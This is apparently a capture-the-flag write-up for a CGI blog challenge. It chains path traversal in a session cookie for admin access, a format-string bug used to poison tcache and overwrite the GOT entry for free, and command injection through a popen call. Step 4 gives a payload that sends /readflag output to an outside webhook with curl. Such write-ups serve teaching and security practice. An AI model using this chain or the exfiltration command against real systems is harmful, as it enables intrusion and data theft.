# TLDR;
1. leak `main.cgi` 
2. set cookie `session=../posts/author/9a437947-455d-49d8-beba-f8b1c27ca65d.author` to escalate to admin
3. upload pwn-post via `exploit.py`'s `exploit_via_web()`, it does:
- there's a format string in `route_view_pretty()`, 
```c
    snprintf(template2,template2_size,template->buf,escaped_title,escaped_author,post,"%s");

    <...SNIP>

    snprintf(template3,template3_size,template2,escaped_content);

    tag_res = read_file(tag_path);
```
- with the format string, hijack tcache to point to GOT. then in `read_file(path)` there's two malloc with controllable size, the value of tag is then will be the new value in GOT.
```c
    __ptr = (buf_and_size *)malloc(0x10);

    <...SNIP>

    __ptr_00 = (char *)malloc(__n + 1);
```
- GOT is then hijacked with `count_files_in_dir(char *path)` since it can be used to do command injection
```c
    snprintf(pcVar3,sVar2 + 0x1e,"ls -l %s | grep \'^-\' | wc -l",path);
    count = -1;
    __stream = popen(pcVar3,"r");
    if (__stream == (FILE *)0x0) {
        count = -1;
    }
```
- GOT function to be overwritten is `free`, free will eventually be called with our cookie as its parameter which is controllable via the LFI-like exploit. this will be pointed at another post which will contain a command injection payload at no.4
4. upload pwn-command-injection with the content `;curl https://webhook.site/f2a040d5-6ae8-465f-ac1c-4b9f2938964f -d $(/readflag)#` and `test` as its title and tag. take note of the ID
5. set cookie `session=../posts/content/<PWN-COMMAND-INJECTION-POST-ID>.content`
6. visit `/cgi-bin/main.cgi/view` multiple times until it visits pwn-post
7. flag is in the webhook